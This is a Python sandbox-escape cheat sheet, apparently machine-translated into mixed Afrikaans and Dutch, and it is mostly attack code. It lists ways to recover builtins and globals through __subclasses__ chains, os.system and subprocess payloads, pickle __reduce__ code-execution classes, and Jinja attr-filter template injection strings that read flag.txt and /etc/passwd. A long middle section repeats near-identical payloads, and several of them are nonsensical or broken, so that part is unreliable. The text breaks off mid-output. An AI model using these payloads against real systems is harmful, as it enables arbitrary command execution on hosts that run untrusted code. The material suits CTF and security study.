Python3 het 'n ingeboude funksie genaamd `eval()` wat gebruik kan word om dinamiese kode uit te voer. Hierdie funksie kan egter 'n groot veiligheidsrisiko inhou, veral wanneer dit gebruik word in 'n omgewing waarin sandbokke of beperkte uitvoeringsomgewings gebruik word.

'n Sandboks is 'n beperkte omgewing waarin die uitvoering van kode beperk is om die potensiële skade wat deur skadelike kodes veroorsaak kan word, te beperk. Python-sandbokke is ontwerp om die uitvoering van onbetroubare kodes te beperk deur toegang tot sekere funksies en hulpbronne te beperk.

Daar is egter maniere om Python-sandbokke te omseil en toegang te verkry tot beperkte funksies en hulpbronne. Hier is 'n paar tegnieke wat gebruik kan word om Python-sandbokke te omseil:

1. **Gebruik van `__builtins__`**: Python-sandbokke beperk gewoonlik die toegang tot die `__builtins__`-module, wat 'n verskeidenheid nuttige funksies bevat. Deur die `__builtins__`-module te omseil, kan jy toegang verkry tot hierdie funksies en dit gebruik om beperkings te omseil.

2. **Gebruik van `sys`-module**: Die `sys`-module in Python bied funksies wat toegang gee tot die uitvoeringsomgewing. Deur die `sys`-module te gebruik, kan jy beperkings omseil en toegang verkry tot beperkte funksies en hulpbronne.

3. **Gebruik van `ctypes`-module**: Die `ctypes`-module in Python maak dit moontlik om C-kode vanuit Python uit te voer. Hierdie tegniek kan gebruik word om beperkings te omseil en toegang te verkry tot beperkte funksies en hulpbronne.

Dit is belangrik om te verstaan dat die omseiling van Python-sandbokke 'n potensiële veiligheidsrisiko inhou en slegs in 'n geoorloofde en etiese konteks gebruik moet word. Die omseiling van sandbokke sonder toestemming kan wettige gevolge hê.

As 'n etiese hacker is dit belangrik om bewus te wees van die potensiële risiko's en om slegs die omseiling van sandbokke te gebruik vir wettige doeleindes, soos die identifisering van veiligheidslekke en die verbetering van die veiligheid van sagteware en toepassings.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Hieronder is 'n groter funksie**](./#rekursiewe-soektog-van-ingeboude-globals) om tientalle/**honderde** van **plekke** te vind waar jy die **ingeboude** funksies kan kry.

#### Python2 en Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Ingeboude payloads

Hieronder vind je enkele voorbeelden van payloads die gebruik maken van ingebouwde functies in Python om Python-sandboxes te omzeilen.

#### `__import__`

De `__import__` functie kan worden gebruikt om modules te importeren en kan handig zijn om beperkingen in de sandbox te omzeilen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
__import__('os').system('command')
```

#### `eval`

De `eval` functie kan worden gebruikt om een willekeurige Python-code uit te voeren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
eval("__import__('os').system('command')")
```

#### `exec`

De `exec` functie kan worden gebruikt om een willekeurige Python-code uit te voeren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
exec("__import__('os').system('command')")
```

#### `compile`

De `compile` functie kan worden gebruikt om een Python-code te compileren en uit te voeren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
code = compile("__import__('os').system('command')", "<string>", "exec")
exec(code)
```

#### `getattr`

De `getattr` functie kan worden gebruikt om een attribuut van een object op te halen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
getattr(__import__('os'), 'system')('command')
```

#### `setattr`

De `setattr` functie kan worden gebruikt om een attribuut van een object in te stellen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
setattr(__import__('os'), 'system', lambda command: __import__('os').system('command'))
```

#### `type`

De `type` functie kan worden gebruikt om het type van een object te controleren of te wijzigen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
type(__builtins__).__dict__['__import__']('os').system('command')
```

#### `globals`

De `globals` functie kan worden gebruikt om de globale variabelen van het huidige script op te halen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
globals()['__builtins__'].__dict__['__import__']('os').system('command')
```

#### `locals`

De `locals` functie kan worden gebruikt om de lokale variabelen van het huidige script op te halen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
locals()['__builtins__'].__dict__['__import__']('os').system('command')
```

#### `vars`

De `vars` functie kan worden gebruikt om de attributen van een object op te halen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
vars(__builtins__).__dict__['__import__']('os').system('command')
```

#### `dir`

De `dir` functie kan worden gebruikt om de attributen van een object op te halen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
dir(__builtins__).__getitem__('__import__')('os').system('command')
```

#### `open`

De `open` functie kan worden gebruikt om een bestand te openen en te manipuleren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
open('file.txt', 'w').write('content')
```

#### `execfile`

De `execfile` functie kan worden gebruikt om een Python-bestand uit te voeren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
execfile('script.py')
```

#### `file`

De `file` functie kan worden gebruikt om een bestand te openen en te manipuleren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
file('file.txt', 'w').write('content')
```

#### `input`

De `input` functie kan worden gebruikt om gebruikersinvoer te verkrijgen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
__import__('os').system(input())
```

#### `raw_input`

De `raw_input` functie kan worden gebruikt om gebruikersinvoer te verkrijgen. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
__import__('os').system(raw_input())
```

#### `compile`

De `compile` functie kan worden gebruikt om een Python-code te compileren en uit te voeren. Hier is een voorbeeld van hoe je deze functie kunt gebruiken:

```python
code = compile("__import__('os').system('command')", "<string>", "exec")
exec(code)
```

#### `__builtins__`

De `__builtins__` variabele kan worden gebruikt om toegang te krijgen tot de ingebouwde functies en objecten van Python. Hier is een voorbeeld van hoe je deze variabele kunt gebruiken:

```python
__builtins__.__dict__['__import__']('os').system('command')
```

#### `__class__`

De `__class__` variabele kan worden gebruikt om toegang te krijgen tot de klasse van een object. Hier is een voorbeeld van hoe je deze variabele kunt gebruiken:

```python
class MyClass:
    def __init__(self):
        self.payload = "__import__('os').system('command')"
        
obj = MyClass()
getattr(obj, '__class__').__setattr__('payload', "__import__('os').system('command')")
```

#### `__subclasses__`

De `__subclasses__` methode kan worden gebruikt om de subklassen van een klasse op te halen. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyBaseClass:
    pass

class MySubClass(MyBaseClass):
    pass

subclasses = MyBaseClass.__subclasses__()
for subclass in subclasses:
    subclass.payload = "__import__('os').system('command')"
```

#### `__bases__`

De `__bases__` variabele kan worden gebruikt om toegang te krijgen tot de basisklassen van een klasse. Hier is een voorbeeld van hoe je deze variabele kunt gebruiken:

```python
class MyBaseClass:
    pass

class MySubClass(MyBaseClass):
    pass

bases = MySubClass.__bases__
for base in bases:
    base.payload = "__import__('os').system('command')"
```

#### `__mro__`

De `__mro__` variabele kan worden gebruikt om de method resolution order (MRO) van een klasse op te halen. Hier is een voorbeeld van hoe je deze variabele kunt gebruiken:

```python
class MyBaseClass:
    pass

class MySubClass(MyBaseClass):
    pass

mro = MySubClass.__mro__
for cls in mro:
    cls.payload = "__import__('os').system('command')"
```

#### `__getattribute__`

De `__getattribute__` methode kan worden gebruikt om een attribuut van een object op te halen. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __getattribute__(self, name):
        return "__import__('os').system('command')"
        
obj = MyClass()
getattr(obj, 'attribute')
```

#### `__getattr__`

De `__getattr__` methode kan worden gebruikt om een attribuut van een object op te halen. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __getattr__(self, name):
        return "__import__('os').system('command')"
        
obj = MyClass()
getattr(obj, 'attribute')
```

#### `__setattr__`

De `__setattr__` methode kan worden gebruikt om een attribuut van een object in te stellen. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __setattr__(self, name, value):
        __import__('os').system('command')
        
obj = MyClass()
setattr(obj, 'attribute', 'value')
```

#### `__delattr__`

De `__delattr__` methode kan worden gebruikt om een attribuut van een object te verwijderen. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __delattr__(self, name):
        __import__('os').system('command')
        
obj = MyClass()
delattr(obj, 'attribute')
```

#### `__call__`

De `__call__` methode kan worden gebruikt om een object als een functie te laten werken. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyCallable:
    def __call__(self, *args, **kwargs):
        __import__('os').system('command')
        
obj = MyCallable()
obj()
```

#### `__init__`

De `__init__` methode kan worden gebruikt om een object te initialiseren. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __init__(self):
        __import__('os').system('command')
        
obj = MyClass()
```

#### `__new__`

De `__new__` methode kan worden gebruikt om een nieuw object van een klasse te maken. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __new__(cls, *args, **kwargs):
        return object.__new__(cls)
        
obj = MyClass()
```

#### `__reduce__`

De `__reduce__` methode kan worden gebruikt om een object te serialiseren. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
obj = MyClass()
pickle.dumps(obj)
```

#### `__reduce_ex__`

De `__reduce_ex__` methode kan worden gebruikt om een object te serialiseren. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __reduce_ex__(self, protocol):
        return (__import__('os').system, ('command',))
        
obj = MyClass()
pickle.dumps(obj)
```

#### `__getstate__`

De `__getstate__` methode kan worden gebruikt om de interne toestand van een object op te halen voor serialisatie. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __getstate__(self):
        return {'payload': "__import__('os').system('command')"}
        
obj = MyClass()
pickle.dumps(obj)
```

#### `__setstate__`

De `__setstate__` methode kan worden gebruikt om de interne toestand van een object in te stellen na deserialisatie. Hier is een voorbeeld van hoe je deze methode kunt gebruiken:

```python
class MyClass:
    def __setstate__(self, state):
        __import__('os').system(state['payload'])
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__setstate__`

De `__reduce__` en `__setstate__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __setstate__(self, state):
        __import__('os').system(state)
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__getattr__`

De `__reduce__` en `__getattr__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __getattr__(self, name):
        return "__import__('os').system('command')"
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__getattribute__`

De `__reduce__` en `__getattribute__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __getattribute__(self, name):
        return "__import__('os').system('command')"
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__setattr__`

De `__reduce__` en `__setattr__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __setattr__(self, name, value):
        __import__('os').system('command')
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__delattr__`

De `__reduce__` en `__delattr__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __delattr__(self, name):
        __import__('os').system('command')
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__call__`

De `__reduce__` en `__call__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __call__(self, *args, **kwargs):
        __import__('os').system('command')
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__init__`

De `__reduce__` en `__init__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __init__(self):
        __import__('os').system('command')
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__new__`

De `__reduce__` en `__new__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __new__(cls, *args, **kwargs):
        return object.__new__(cls)
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__getstate__`

De `__reduce__` en `__getstate__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __getstate__(self):
        return {'payload': "__import__('os').system('command')"}
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__` en `__setstate__`

De `__reduce__` en `__setstate__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __setstate__(self, state):
        __import__('os').system(state['payload'])
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```

#### `__reduce__`, `__getstate__` en `__setstate__`

De `__reduce__`, `__getstate__` en `__setstate__` methoden kunnen samen worden gebruikt om een object te serialiseren en deserialiseren. Hier is een voorbeeld van hoe je deze methoden kunt gebruiken:

```python
class MyClass:
    def __reduce__(self):
        return (__import__('os').system, ('command',))
        
    def __getstate__(self):
        return {'payload': "__import__('os').system('command')"}
        
    def __setstate__(self, state):
        __import__('os').system(state['payload'])
        
obj = MyClass()
pickle.loads(pickle.dumps(obj))
```
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals en locals

Om te weet wat jy kan toegang kry, is dit 'n goeie idee om die **`globals`** en **`locals`** te kontroleer.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Hieronder is 'n groter funksie**](./#rekursiewe-soektog-van-ingeboude-globals) om tientalle/**honderde** plekke te vind waar jy die **globals** kan vind.

## Ontdek Willekeurige Uitvoering

Hier wil ek verduidelik hoe om maklik **meer gevaarlike funksionaliteite te ontdek** en meer betroubare exploits voor te stel.

#### Toegang tot subklasse met omseilings

Een van die mees sensitiewe dele van hierdie tegniek is om toegang te hê tot die basis subklasse. In die vorige voorbeelde is dit gedoen deur gebruik te maak van `''.__class__.__base__.__subclasses__()` maar daar is **ander moontlike maniere**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Opsoek na gevaarlike biblioteke wat gelaai is

Byvoorbeeld, deur te weet dat dit met die biblioteek **`sys`** moontlik is om **arbitrêre biblioteke in te voer**, kan jy soek na al die **modules wat gelaai is en wat sys binne hulle ingevoer het**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Daar is baie, en **ons het net een nodig** om opdragte uit te voer:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Ons kan dieselfde ding doen met **ander biblioteke** wat ons weet kan gebruik word om **opdragte uit te voer**:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Verder kan ons selfs soek watter modules skadelike biblioteke laai:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
